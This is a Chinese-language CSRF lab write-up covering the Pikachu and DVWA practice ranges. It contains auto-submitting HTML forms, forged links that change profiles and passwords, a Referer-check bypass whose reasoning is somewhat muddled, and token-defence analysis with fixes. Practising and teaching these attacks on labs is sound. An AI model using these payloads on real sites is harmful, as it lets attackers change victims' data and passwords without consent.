# CSRF 实战（Pikachu GET/POST + DVWA low/medium + Token 防御分析）

**靶场**：Pikachu CSRF（ctf.eagleslab.com:41136）+ DVWA CSRF
**安全等级**：Low / Medium
**时间**：2026.01 / 2026.08

## 1. Pikachu CSRF(GET) — 修改个人信息

### 1.1 抓包

```
GET http://ctf.eagleslab.com:41136/vul/csrf/csrfget/csrf_get_edit.php?
    sex=girl&phonenum=18888888888&add=111&email=123456&submit=submit
```

### 1.2 改包重放

```
GET http://ctf.eagleslab.com:41136/vul/csrf/csrfget/csrf_get_edit.php?
    sex=girl&phonenum=6666&add=usa&email=lucy%40pikachu.com&submit=submit
```

同一浏览器直接访问 → 受害者在不知情下个人信息被改。

### 1.3 攻击利用

把改包后的 URL 生成短链/二维码，发给受害者点击即触发。

### 1.4 Burp CSRF PoC

`Engagement tools → Generate CSRF PoC` 一键生成 HTML PoC：

```html
<html>
  <body>
    <form action="http://ctf.eagleslab.com:41136/vul/csrf/csrfget/csrf_get_edit.php" method="GET">
      <input name="sex" value="girl">
      <input name="phonenum" value="6666">
      <input name="add" value="usa">
      <input name="email" value="attacker@x.com">
      <input name="submit" value="submit">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

把 PoC 部署到攻击者服务器，受害者访问该 HTML → 自动提交 → 改信息成功。

## 2. CSRF(POST) — 自动提交表单

请求方式换成 POST，思路一致：构造自动提交表单的 PoC 页面，受害者访问即触发。

```html
<form action="..." method="POST" id="csrf">
  <input name="phonenum" value="6666"> ...
</form>
<script>document.getElementById('csrf').submit();</script>
```

## 3. CSRF Token 防御分析

### 3.1 抓包重放失败的根本原因

源码会**校验表单提交的 token 是否与会话中有效 token 一致**：

```
GET /csrf_get_edit.php        → 服务器生成 token_A 写进页面 hidden input
POST /csrf_get_edit.php (含 token_A)  → 服务器校验，token_A 标记为「已使用」
第二次 POST (同一 token_A)     → 校验失败，拒绝
```

**抓包时看到的请求里是有效 token，但服务器一旦处理就立刻作废**——这就是抓的最新请求却重放失败的原因。

### 3.2 Token 完整生命周期

1. **生成**：GET 页面时服务器生成 token，写进 HTML + 存进 session
2. **提交**：POST 时表单带 token，服务器校验
3. **校验**：一致 → 执行业务 + 标记 token 失效
4. **失效**：刷新页面 / 重复提交 / 会话过期都会让旧 token 失效

### 3.3 为什么重放攻击会失败

- 重放时 token 已是「已使用」状态
- 服务器拒绝

### 3.4 攻击者能否绕过

- 单纯抓包重放 → ❌ 失败
- 抓包读取 token 后立刻伪造请求 → 仍需受害者当前会话 + 一次性 token，**几乎无法利用**
- XSS 偷 token → ⚠️ 必须先有 XSS（见 XSS writeup），但 XSS 一旦成立危害远超 CSRF

## 4. DVWA CSRF

### 4.1 Low（GET 改密）

```
http://192.168.23.128/dvwa/vulnerabilities/csrf/?
    password_new=password&password_conf=password&Change=Change#
```

诱导已登录用户点链接 → 密码被改。

### 4.2 Medium（Referer 校验）

```php
if (stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false) { ... }
```

绕过：Referer 包含目标 host 即可，可构造：
```
Referer: http://target/dvwa/xxx
```
（攻击者页面用 `<img src="http://target/dvwa/...">` 让浏览器自动带 Referer）

## 5. 修复建议

1. **CSRF Token**（推荐）：表单嵌入一次性 token，服务端校验
2. **SameSite Cookie**：`Set-Cookie: session=xxx; SameSite=Strict` → 跨站请求不携带
3. **Referer 校验**（辅助）：白名单允许的 origin
4. **敏感操作二次验证**：改密/转账要求短信/邮箱验证码

## 6. 复测

- 加 CSRF Token 后：GET 重放直接 403
- SameSite=Strict 后：跨站表单完全不携带 session
- 双因素验证（短信）后：CSRF 完全失效
